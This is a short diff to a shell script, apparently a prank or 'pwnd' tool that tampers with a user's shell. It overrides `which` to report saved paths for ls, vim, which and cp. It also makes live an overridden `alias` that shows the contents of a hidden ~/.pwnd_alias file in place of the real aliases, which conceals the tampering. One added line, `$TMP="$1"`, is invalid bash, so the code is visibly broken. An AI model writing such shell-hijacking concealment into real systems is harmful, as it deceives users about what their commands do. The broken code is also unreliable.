@@ -3,6 +3,7 @@ alias > $HOME/.pwnd_alias
 MYLS=$(which ls)
 MYVIM=$(which vim)
 MYWHICH=$(which which)
+MYCP=$(which cp)
 
 function which {
     case "$1" in
@@ -15,27 +16,30 @@ function which {
         which)
             echo "$MYWHICH"
             ;;
+        cp)
+            echo "$MYCP"
+            ;;
         *)
-            builtin which $@
+            builtin which $@ 2>/dev/null || /usr/bin/which $@
     esac
 }
 
-#function alias {
-#    if [ "$#" -eq 0 ]; then
-#        cat $HOME/.pwnd_alias
-#        return
-#    fi
+function alias {
+    if [ "$#" -eq 0 ]; then
+        cat $HOME/.pwnd_alias
+        return
+    fi
 #TODO: FIX
 #    pwnd_funcs=("alias" "ls" "cd")
-#    $TMP="$1"
+    $TMP="$1"
 #    $IFS=$'='
 #    aname=${TMP[0]}
 #    $IFS=$' '
 #    if [[ ! $aname =~ (^| )$pwnd_funcs($| ) ]]; then
 #        $(which alias) $TMP
 #    fi
-#    echo "$TMP" >> $HOME/.pwnd_alias
-#}
+    echo "$TMP" >> $HOME/.pwnd_alias
+}
 
 HEALTH=15
 
